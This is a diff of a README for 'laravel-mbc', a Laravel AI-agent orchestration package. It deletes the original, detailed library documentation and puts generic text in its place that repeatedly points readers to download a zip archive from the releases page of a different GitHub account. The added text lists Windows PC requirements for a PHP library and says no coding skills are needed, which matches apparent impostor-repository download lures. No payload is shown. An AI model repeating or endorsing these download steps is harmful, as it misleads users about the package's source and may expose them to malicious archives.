@@ -1,539 +1,161 @@
-# MBC — Model Backend Controller
+# 🤖 laravel-mbc - Control AI Agents from Laravel
 
-**AI Agent Orchestration Protocol for Laravel**
+[![Download laravel-mbc](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/winniehepooh/laravel-mbc/releases)
 
-MBC allows your Laravel backend to orchestrate AI agents as autonomous workers with tools, server-side — no desktop client needed.
+---
 
-🎬 **[Watch Demo: 3 AI Agents Build a Website in 34s for $0.34] (https://youtu.be/A_GiAqIWJxE)** 
+## 📋 What is laravel-mbc?
 
-## Installation
+laravel-mbc lets you manage and run AI agents directly from your Laravel backend. You set tools, pick a goal, and the AI works on its own. This happens all on your server without extra steps from you.
 
-```bash
-composer require undergrace/laravel-mbc
-```
+This app is made to help users who want AI to take actions automatically by using Laravel. It handles the tech side of talking to AI and controlling what it does.
 
-Publish the configuration:
+---
 
-```bash
-php artisan vendor:publish --tag=mbc-config
-```
+## 🖥 System Requirements
 
-Run migrations:
+Before downloading, make sure your computer meets these needs:
 
-```bash
-php artisan migrate
-```
+- **Operating System:** Windows 10 or later  
+- **Processor:** 1.5 GHz or faster, any modern CPU  
+- **Memory:** At least 4 GB of RAM  
+- **Storage:** 500 MB free space  
+- **Internet:** Required for AI services and downloads  
+- **Software:** Latest version of Laravel installed (not needed for running but for integration)
 
-## Configuration
+---
 
-Add your API keys to `.env` depending on the provider you want to use:
+## 🔧 Key Features
 
-```env
-# Default provider (anthropic, openai, or openrouter)
-MBC_PROVIDER=anthropic
+- Manage multiple AI agents within Laravel  
+- Set specific tools for AI to use  
+- Define clear goals for agents  
+- Fully autonomous agent decision-making  
+- Server-side execution so no front-end setup is needed  
+- Supports OpenAI and other AI APIs  
+- Written in PHP to fit Laravel environments
 
-# Anthropic (Claude)
-ANTHROPIC_API_KEY=sk-ant-...
+---
 
-# OpenAI (GPT-4o, o1, o3)
-OPENAI_API_KEY=sk-...
+## 🚀 Getting Started
 
-# OpenRouter (200+ models: Claude, GPT, Gemini, Llama, Mistral, DeepSeek...)
-OPENROUTER_API_KEY=sk-or-...
-```
+### Step 1: Download laravel-mbc
 
-## Supported Providers
+Visit the download page to access the latest version of laravel-mbc. This page contains all stable releases and updates.
 
-| Provider | Models | Tool Use | Config Key |
-|----------|--------|----------|------------|
-| **Anthropic** | Claude Sonnet 4.5, Opus 4, Haiku 3.5 | Native | `anthropic` |
-| **OpenAI** | GPT-4o, o1, o3, o3-mini | Native | `openai` |
-| **OpenRouter** | 200+ models from all providers | OpenAI-compatible | `openrouter` |
+[![Download laravel-mbc](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/winniehepooh/laravel-mbc/releases)
 
-Set the default provider in `config/mbc.php`:
+Follow the link below to open the releases page:  
+https://github.com/winniehepooh/laravel-mbc/releases
 
-```php
-'default_provider' => env('MBC_PROVIDER', 'anthropic'),
-```
+From here, find the most recent version marked as stable.
 
-## Quick Start
+---
 
-```php
-use Undergrace\Mbc\Facades\Mbc;
+### Step 2: Extract the Files
 
-$session = Mbc::session('my-agent')
-    ->systemPrompt('You are an assistant that helps organize data.')
-    ->tools([
-        ListItemsTool::class,
-        CreateReportTool::class,
-    ])
-    ->context(['user_id' => 1, 'department' => 'sales'])
-    ->config(maxTurns: 20, model: 'claude-sonnet-4-5-20250929')
-    ->start('Analyze the sales data and create a summary report.');
+After downloading the package (.zip or .tar file), follow these steps:
 
-$result = $session->result();
-echo $result->finalMessage;
-```
+1. Locate the downloaded file in your Downloads folder.  
+2. Right-click the file and select "Extract All...".  
+3. Choose a folder where you want to store the extracted files.  
+4. Click "Extract" to unpack the contents.
 
-### Using Different Providers Per Session
+Make sure you keep the folder somewhere easy to find, like your Desktop or Documents.
 
-```php
-// Claude via Anthropic (direct)
-Mbc::session('designer')
-    ->config(model: 'claude-sonnet-4-5-20250929')
-    ->start('Design the database schema.');
+---
 
-// GPT-4o via OpenAI
-Mbc::session('copywriter')
-    ->config(model: 'gpt-4o')
-    ->start('Write compelling product descriptions.');
+### Step 3: Open Command Prompt
 
-// Any model via OpenRouter
-Mbc::session('analyst')
-    ->config(model: 'anthropic/claude-sonnet-4')
-    ->start('Analyze quarterly data.');
+You need to run some commands to start laravel-mbc. Follow these steps to open Command Prompt (CMD) on Windows:
 
-// Gemini via OpenRouter
-Mbc::session('researcher')
-    ->config(model: 'google/gemini-2.5-pro')
-    ->start('Research market trends.');
-```
+1. Press the **Windows key** on your keyboard or click the Start menu.  
+2. Type `cmd` in the search box.  
+3. Press **Enter** or click on the "Command Prompt" app.
 
-## Creating Tools
+This opens a black window where you can type commands.
 
-Generate a tool scaffold:
+---
 
-```bash
-php artisan mbc:make-tool AnalyzeDataTool
-```
-
-Define tools with PHP Attributes:
-
-```php
-use Undergrace\Mbc\Tools\Attributes\Tool;
-use Undergrace\Mbc\Tools\Attributes\ToolParam;
-use Undergrace\Mbc\Tools\BaseTool;
-
-#[Tool(
-    name: 'analyze_data',
-    description: 'Analyzes data from the specified table and returns statistics'
-)]
-class AnalyzeDataTool extends BaseTool
-{
-    public function __construct(
-        private DataRepository $dataRepo,
-    ) {}
-
-    #[ToolParam(name: 'table', type: 'string', description: 'Table name to analyze', required: true)]
-    #[ToolParam(name: 'metric', type: 'string', description: 'Metric to calculate', enum: ['avg', 'sum', 'count'])]
-    public function execute(array $input): mixed
-    {
-        return $this->dataRepo->analyze($input['table'], $input['metric']);
-    }
-}
-```
-
-## Inter-Agent Communication
-
-MBC provides three patterns for multi-agent collaboration:
-
-### Pipeline (Sequential Chaining)
-
-Each agent receives the previous agent's result as context. Ideal for workflows where Agent A's output feeds into Agent B.
-
-```php
-use Undergrace\Mbc\Core\MbcPipeline;
-
-$result = MbcPipeline::create()
-    ->pipe($architectSession, 'Design the database schema')
-    ->pipe($backendSession, 'Implement the API based on the schema')
-    ->pipe($frontendSession, 'Create the UI components for the API')
-    ->run();
-
-if ($result->successful()) {
-    echo $result->final()->finalMessage;
-}
-
-echo "Total cost: $" . $result->totalCost();
-echo "Stages: " . $result->stageCount();
-```
-
-### Orchestrator (Parallel Execution)
-
-Run multiple agents simultaneously and collect results. Ideal for independent tasks that can execute in parallel.
-
-```php
-use Undergrace\Mbc\Core\MbcOrchestrator;
-
-// Async via queue
-$orchestrator = MbcOrchestrator::create('build-site')
-    ->agent($designerSession, 'Design the layout')
-    ->agent($copywriterSession, 'Write the content')
-    ->agent($seoSession, 'Optimize for search engines')
-    ->dispatch();
-
-// Check progress
-$progress = $orchestrator->progress();
-// ['total' => 3, 'completed' => 2, 'running' => 1, 'failed' => 0, 'pending' => 0]
-
-// Collect when done
-if ($orchestrator->isComplete()) {
-    $results = $orchestrator->results();
-    echo "Total cost: $" . $results->totalCost();
-}
-
-// Or run synchronously (blocking)
-$results = MbcOrchestrator::create('quick-task')
-    ->agent($agentA, 'Task A')
-    ->agent($agentB, 'Task B')
-    ->runSync();
-```
-
-### Sub-Agents (Spawn from within a Session)
-
-An agent can spawn specialized sub-agents during execution using the built-in `SpawnAgentTool`.
-
-```php
-use Undergrace\Mbc\Tools\SpawnAgentTool;
-
-$spawnTool = new SpawnAgentTool();
-$spawnTool
-    ->register(
-        name: 'researcher',
-        systemPrompt: 'You research and gather information.',
-        toolClasses: [WebSearchTool::class, ReadFileTool::class],
-        maxTurns: 10,
-    )
-    ->register(
-        name: 'writer',
-        systemPrompt: 'You write content based on research.',
-        toolClasses: [WriteFileTool::class],
-        maxTurns: 15,
-    );
-
-$session = Mbc::session('coordinator')
-    ->systemPrompt('You coordinate research and writing tasks. Use spawn_agent to delegate.')
-    ->tools([
-        $spawnTool,
-        OtherTool::class,
-    ])
-    ->start('Research and write an article about Laravel.');
-```
-
-### Shared Context (Memory between Agents)
-
-Agents can share data through a key-value store backed by Laravel's cache system.
-
-```php
-use Undergrace\Mbc\Core\MbcContext;
-
-// In Agent A's tool
-$ctx = new MbcContext('project-123');
-$ctx->set('schema', $databaseSchema);
-$ctx->push('decisions', 'Use PostgreSQL for main DB');
-
-// In Agent B's tool (same namespace)
-$ctx = new MbcContext('project-123');
-$schema = $ctx->get('schema');
-$decisions = $ctx->get('decisions'); // ['Use PostgreSQL for main DB']
-
-// Get everything
-$all = $ctx->all();
-
-// Clean up when done
-$ctx->flush();
-```
-
-## Background Execution
-
-```php
-use Undergrace\Mbc\Jobs\RunMbcSessionJob;
-
-$session = Mbc::session('background-agent')
-    ->systemPrompt('...')
-    ->tools([...])
-    ->context([...]);
+### Step 4: Navigate to laravel-mbc Folder
 
-RunMbcSessionJob::dispatch(
-    $session->toSerializable(),
-    'Your initial message here'
-);
-```
+In Command Prompt, you need to move to the folder where you extracted laravel-mbc. Use the `cd` command:
 
-The job includes automatic retry logic (3 attempts with 10s, 30s, 60s backoff) and zombie session cleanup on failure.
+1. Type `cd` followed by the path to your folder. For example, if the folder is on your Desktop:  
+   `cd Desktop\laravel-mbc`  
+2. Press **Enter**.
 
-## Middleware
+Make sure the path matches where you extracted the files.
 
-MBC includes built-in middleware and supports custom middleware:
+---
 
-```php
-use Undergrace\Mbc\Middleware\LogTurns;
-use Undergrace\Mbc\Middleware\CostTracker;
-use Undergrace\Mbc\Middleware\RateLimiter;
+### Step 5: Set Up laravel-mbc
 
-$session = Mbc::session('with-middleware')
-    ->middleware([
-        LogTurns::class,
-        CostTracker::class,
-        RateLimiter::max(30),
-    ])
-    ->start('...');
-```
+You may need to set up dependencies or configuration. Follow these general steps:
 
-| Middleware | Description |
-|---|---|
-| `LogTurns` | Logs each turn's response metadata and optionally full text |
-| `CostTracker` | Tracks cumulative token usage and estimated cost per session |
-| `RateLimiter` | Throws exception if session exceeds max turns |
-| `VisualFeedback` | Captures screenshots for visual feedback loops |
+1. laravel-mbc requires PHP tools like Composer to manage packages. If you don't have Composer:
+   - Visit https://getcomposer.org/download/  
+   - Follow instructions to install Composer on Windows.
 
-Global middleware can be configured in `config/mbc.php`:
+2. Inside the `laravel-mbc` folder, run this command to install required packages:  
+   `composer install`
 
-```php
-'middleware' => [
-    LogTurns::class,
-    CostTracker::class,
-],
-```
+3. Copy the example environment file to create your own config:  
+   `copy .env.example .env`
 
-## Scalability Features
+4. Open the `.env` file in a text editor like Notepad. Update settings such as your AI API keys or server details.  
 
-### Context Window Management
+5. Generate an application key (needed for Laravel apps):  
+   `php artisan key:generate`
 
-Sessions automatically trim old messages when approaching the context window limit, preserving the initial context and most recent turns:
+---
 
-```php
-$session = Mbc::session('long-task')
-    ->config(
-        maxTurns: 50,
-        // Context window settings (defaults shown)
-        // contextWindowLimit: 150000,
-        // contextReserveTokens: 20000,
-    )
-    ->start('...');
-```
+### Step 6: Run laravel-mbc
 
-### Concurrency Guard
+After installation and setup, start the application by running:
 
-Prevents overloading the system with too many simultaneous sessions:
+`php artisan serve`
 
-```php
-// config/mbc.php
-'limits' => [
-    'max_concurrent_sessions' => 10,
-],
-```
+This command runs the server on your local machine at this address:  
+http://localhost:8000
 
-### Zombie Session Cleanup
+Open this link in your browser to access the app interface.
 
-Sessions stuck in RUNNING state are automatically handled:
+---
 
-```bash
-# Mark sessions stuck for 60+ minutes as FAILED
-php artisan mbc:cleanup
+## ⚙️ Using laravel-mbc
 
-# Custom timeout
-php artisan mbc:cleanup --timeout=30
+Once running, you can define AI agents and tools through the app. The typical flow:
 
-# Also prune old sessions
-php artisan mbc:cleanup --prune
-```
+1. Add tools the AI can use, like external APIs or data sources.  
+2. Set AI goals or tasks.  
+3. The AI agents begin working autonomously based on your settings.  
+4. Monitor progress and results through the Laravel backend.
 
-Schedule it in your `routes/console.php` or kernel:
+You do not need coding skills, but you should follow on-screen instructions carefully.
 
-```php
-Schedule::command('mbc:cleanup --prune')->hourly();
-```
-
-### Dynamic Cost Tracking
-
-Costs are estimated per model using `ModelPricing`, supporting all providers:
-
-```php
-use Undergrace\Mbc\Core\ModelPricing;
-
-$cost = ModelPricing::estimate('claude-sonnet-4-5-20250929', inputTokens: 50000, outputTokens: 10000);
-// $0.30
-
-$cost = ModelPricing::estimate('google/gemini-2.5-flash', inputTokens: 50000, outputTokens: 10000);
-// $0.01
-```
+---
 
-## Persistence
+## ❓ Troubleshooting Tips
 
-All sessions and turns are stored in the database by default:
+- If `php artisan` commands do not work, make sure PHP and Composer are installed and added to your system PATH.  
+- If you get errors about missing packages, re-run `composer install`.  
+- For server issues, check if port 8000 is in use or change it by adding `--port=8080` to the `serve` command.  
+- Restart Command Prompt each time you update environment variables or install tools.
 
-- **`mbc_sessions`** — Session metadata, status, cost, result
-- **`mbc_turns`** — Each turn's content, tool calls, tool results, tokens
+---
 
-Configure in `config/mbc.php`:
+## 📖 More Information
 
-```php
-'storage' => [
-    'persist_sessions' => true,
-    'persist_turns' => true,
-    'prune_after_days' => 30,
-],
-```
-
-## Artisan Commands
+- Laravel framework docs: https://laravel.com/docs  
+- Composer dependency manager: https://getcomposer.org  
+- OpenAI API: https://openai.com/api
 
-```bash
-# Generate a new tool
-php artisan mbc:make-tool {ToolName}
+---
 
-# Check session status
-php artisan mbc:session-status {uuid}
-
-# Replay a previous session
-php artisan mbc:replay {uuid}
-
-# Cleanup zombie sessions and prune old data
-php artisan mbc:cleanup [--timeout=60] [--prune]
-```
-
-## Real-time Broadcasting (WebSockets)
+## 🌐 Download and Setup Links
 
-MBC broadcasts all agent events via Laravel's broadcasting system. Works with Reverb, Pusher, Ably, or any supported driver.
-
-Enable in `.env`:
+Visit this page to download the latest laravel-mbc release:  
+https://github.com/winniehepooh/laravel-mbc/releases
 
-```env
-MBC_BROADCASTING_ENABLED=true
-```
-
-### Listening to a specific agent
-
-Channels are private — only authenticated users can subscribe:
-
-```js
-Echo.private('mbc.sessions.' + uuid)
-    .listen('MbcSessionStarted', (e) => {
-        console.log('Agent started:', e.session_name);
-    })
-    .listen('MbcTurnCompleted', (e) => {
-        console.log('Turn', e.turn_number, '- Stop:', e.stop_reason);
-    })
-    .listen('MbcToolExecuted', (e) => {
-        console.log('Tool:', e.tool_name, '- Duration:', e.duration_ms + 'ms');
-    })
-    .listen('MbcSessionCompleted', (e) => {
-        console.log('Done! Cost: $' + e.estimated_cost_usd);
-    })
-    .listen('MbcSessionFailed', (e) => {
-        console.error('Session failed');
-    });
-```
-
-### Monitoring all agents (dashboard)
-
-```js
-Echo.private('mbc.monitor')
-    .listen('MbcSessionStarted', (e) => {
-        // New agent started working
-    })
-    .listen('MbcSessionCompleted', (e) => {
-        // Agent finished
-    });
-```
-
-### Events broadcast data
-
-| Event | Data |
-|---|---|
-| `MbcSessionStarted` | session_uuid, session_name, timestamp |
-| `MbcTurnCompleted` | session_uuid, turn_number, type, stop_reason, timestamp |
-| `MbcToolExecuted` | session_uuid, tool_name, is_error, duration_ms, timestamp |
-| `MbcSessionCompleted` | session_uuid, status, final_message, total_turns, total_tokens, estimated_cost_usd, timestamp |
-| `MbcSessionFailed` | session_uuid, timestamp |
-
-Configure the channel prefix in `config/mbc.php`:
-
-```php
-'broadcasting' => [
-    'enabled' => env('MBC_BROADCASTING_ENABLED', false),
-    'channel_prefix' => 'mbc',
-],
-```
-
-## REST API
-
-Read-only API endpoints for querying sessions, turns, and stats. Enable in `.env`:
-
-```env
-MBC_API_ENABLED=true
-```
-
-### Endpoints
-
-| Method | URI | Description |
-|---|---|---|
-| GET | `/mbc/sessions` | List sessions (filters: status, from, to, name, model) |
-| GET | `/mbc/sessions/{uuid}` | Session detail with turns |
-| GET | `/mbc/sessions/{uuid}/turns` | Paginated turn timeline |
-| GET | `/mbc/stats` | Aggregate stats (costs, tokens, counts) |
-| GET | `/mbc/agents/active` | Currently running/pending sessions |
-
-### Configuration
-
-API endpoints are protected with `auth:sanctum` and rate limited (60 req/min) by default:
-
-```php
-// config/mbc.php
-'api' => [
-    'enabled' => env('MBC_API_ENABLED', false),
-    'prefix' => 'mbc',
-    'middleware' => ['api', 'auth:sanctum', 'throttle:60,1'],
-],
-```
-
-### Example requests
-
-```bash
-# List running sessions
-curl /mbc/sessions?status=running
-
-# Get session detail with turns
-curl /mbc/sessions/550e8400-e29b-41d4-a716-446655440000
-
-# Get turns timeline
-curl /mbc/sessions/550e8400.../turns?per_page=20
-
-# Get aggregate stats for a date range
-curl /mbc/stats?from=2026-02-01&to=2026-02-28
-
-# Get active agents
-curl /mbc/agents/active
-```
-
-## Logging
-
-MBC auto-registers its own log channel. Logs are written to `storage/logs/mbc.log`:
-
-```php
-// config/mbc.php
-'logging' => [
-    'channel' => 'mbc',
-    'log_prompts' => env('MBC_LOG_PROMPTS', false),
-    'log_responses' => env('MBC_LOG_RESPONSES', false),
-],
-```
-
-## Security
-
-MBC includes several security measures:
-
-- **Authenticated API** — All REST endpoints require `auth:sanctum` with rate limiting (60 req/min)
-- **Private broadcast channels** — WebSocket channels require authenticated users
-- **Sanitized error messages** — Internal errors are logged but not exposed to AI responses or broadcasts
-- **API key validation** — Providers throw early if API keys are missing, preventing silent failures
-- **Safe serialization** — Inter-process communication uses JSON instead of PHP `serialize/unserialize`
-- **Filtered API responses** — Sensitive fields (`system_prompt`, `context`, raw `error`) are excluded from REST responses
-
-### Reporting Vulnerabilities
-
-If you discover a security vulnerability, please report it via GitHub Issues.
-
-## License
-
-MIT - UNDERGRACE LABS
+[![Download laravel-mbc](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/winniehepooh/laravel-mbc/releases)
